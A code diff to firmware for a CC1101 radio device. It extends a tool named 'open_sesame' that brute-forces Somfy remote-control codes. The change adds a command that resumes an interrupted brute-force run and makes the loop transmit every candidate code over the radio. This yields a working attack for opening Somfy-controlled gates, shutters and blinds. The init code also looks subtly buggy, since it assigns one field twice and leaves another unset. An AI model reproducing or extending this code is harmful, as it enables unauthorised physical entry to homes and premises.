@@ -19,6 +19,7 @@ CmdStatus_e open_sesame_somfy_setcode(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_setmask(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_setirange(void* parent,int argc, char* argv[]);
 CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[]);
+CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[]);
 CmdHandler* getRootCommandHandler(void);
 CC1101* getRadio(void);
 //------------------------------------------------------------------------------------------------------------------
@@ -32,7 +33,8 @@ typedef struct SomfyBruteContext_s
     uint64_t itstart;
     uint64_t itend;
     uint64_t curr;
-  
+    bool cont;
+
 } SomfyBruteContext_t;
 //------------------------------------------------------------------------------------------------------------------
 SomfyBruteContext_t somfy_ctx;
@@ -52,6 +54,7 @@ cmd_handler_t open_sesame_somfy_sub_cmd[] = {
    { &open_sesame_somfy_setmask,   &open_sesame_handler, NULL, "smsk", "set iteration mask c0msk<hex> c1msk<hex> c2msk<hex>", 3, "xxx", "opensesame somfy smsk 007FFFFF FFFFFFFF 00070000"},
    { &open_sesame_somfy_setirange, &open_sesame_handler, NULL, "sir",  "set iteration range start_hi<hex> start_lo<hex> end_hi<hex> end_lo<hex>", 4, "xxxx", "opensesame somfy sir 00000000 00000000 FFFFFFFF FFFFFFFF"},
    { &open_sesame_somfy_process  , &open_sesame_handler, NULL, "brute", "brute iteration of codes, display interval<int>", 1, "i", "opensesame somfy brute 10000<int ms>"},
+   { &open_sesame_somfy_cont     , &open_sesame_handler, NULL, "brutc", "continue brute iteration of codes, display interval<int>", 1, "i", "opensesame somfy brutc 10000<int ms>"},
    { 0,  0, NULL, "",  "", 0, "","" }
 };
 //------------------------------------------------------------------------------------------------------------------
@@ -59,6 +62,10 @@ void opensesame_cmd_init(void)
 { 
   open_sesame_sub_cmd[2].sub_cmd = open_sesame_somfy_sub_cmd;
   getRootCommandHandler()->registerHandler(&open_sesame_handler, open_sesame_sub_cmd); 
+  somfy_ctx.c0 = 0x09800000;
+  somfy_ctx.c1 = 0x00000000;
+  somfy_ctx.c1 = 0xffea8000;
+  somfy_ctx.cont = false;
 }
 //------------------------------------------------------------------------------------------------------------------
 CmdStatus_e open_sesame_main(void* parent,int argc, char* argv[])
@@ -189,12 +196,12 @@ CmdStatus_e open_sesame_somfy_setirange(void* parent,int argc, char* argv[])
 }
 
 //------------------------------------------------------------------------------------------------------------------
-String open_sesame_somfy_ctx_describe(uint32_t c0, uint32_t c1, uint32_t c2, struct SomfyBruteContext_s& ctx)
+String open_sesame_somfy_ctx_describe(uint32_t c0, uint32_t c1, uint32_t c2, struct SomfyBruteContext_s& ctx, uint32_t startMs)
 {
      char buffer[128];
-     sprintf(buffer, "cnt:%08x%08x c0: %08x c1: %08x c2: %08x", 
+     sprintf(buffer, "cnt:%08x%08x c0: %08x c1: %08x c2: %08x ts:%s", 
         (uint32_t)(ctx.curr >> 32) & 0xffffffff, (uint32_t)(ctx.curr) & 0xffffffff,
-        c0, c1, c2);
+        c0, c1, c2, millis_to_time(millis() - startMs).c_str());
 
      return String(buffer);
     
@@ -202,13 +209,14 @@ String open_sesame_somfy_ctx_describe(uint32_t c0, uint32_t c1, uint32_t c2, str
 //------------------------------------------------------------------------------------------------------------------
 CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
 {
-
     uint32_t disp = atoi(argv[3]);
     bool cont = true;
     String msg;
     uint32_t c0;
     uint32_t c1;
     uint32_t c2;
+    int pulses;
+    int p;
     
     if (disp == 0 || disp < 2000 || disp > 360000)
     {
@@ -247,8 +255,14 @@ CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
     STDOUT.print("\n\r");
     STDOUT.println(" press ctrl-c/f/d to terminate...");
 
-    somfy_ctx.curr = somfy_ctx.itstart;
-    uint32_t s = millis();
+
+    if (!somfy_ctx.cont)
+        somfy_ctx.curr = somfy_ctx.itstart;
+    else
+        somfy_ctx.cont = false;
+
+    uint32_t startMs = millis();
+    uint32_t s = startMs;
     while(somfy_ctx.curr <= somfy_ctx.itend && cont)
     {
        c0 = somfy_ctx.c0;
@@ -257,15 +271,25 @@ CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
 
        apply_value_to_bitmask(&c0, &c1, &c2, somfy_ctx.c0msk,somfy_ctx.c1msk,somfy_ctx.c2msk, somfy_ctx.curr);
 
-       msg = "brut tx:" + open_sesame_somfy_ctx_describe(c0,c1,c2,somfy_ctx);
+       somfy.setCodes(c0, c1, c2);
+
+       radio_pulses_flush();
+
+
+       pulses = 0;
+       somfy.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, 0);       
+       pulses += p;
+       somfy.toPulses(&radio_pulses_get_pulses()[pulses], radio_pulses_max_count() - pulses, &p, 1);
+       pulses += p;
+       radio_pulses_send(0, pulses);
+       
        if (millis() -s > disp)
        {
-
+           msg = "brut tx:" + open_sesame_somfy_ctx_describe(c0,c1,c2,somfy_ctx, startMs);
            STDOUT.print(msg); STDOUT.print("\n\r");
            s = millis();
        }
 
-      
        somfy_ctx.curr++;
         if (STDIN.available() > 0)
         {
@@ -278,11 +302,26 @@ CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
            }
         }
     }
-    msg = "brut last tx:" + open_sesame_somfy_ctx_describe(c0,c1,c2,somfy_ctx);
+    msg = "brut last tx:" + open_sesame_somfy_ctx_describe(c0,c1,c2,somfy_ctx, startMs);
     STDOUT.print(msg); STDOUT.print("\n\r");
     STDOUT.print("brute stop\n\r");
     
 
     return CmdStatus_e::OK;
+}
+//------------------------------------------------------------------------------------------------------------------
+CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[])
+{
+    uint32_t disp = atoi(argv[3]);
+    
+    if (disp == 0 || disp < 2000 || disp > 360000)
+    {
+         getRootCommandHandler()->setResultMessage("wrong display period");
+         return WRONG_PARAMS;
+    }
+
+    somfy_ctx.cont = true;
+
+    return open_sesame_somfy_process(parent, argc, argv);
 }
 //------------------------------------------------------------------------------------------------------------------
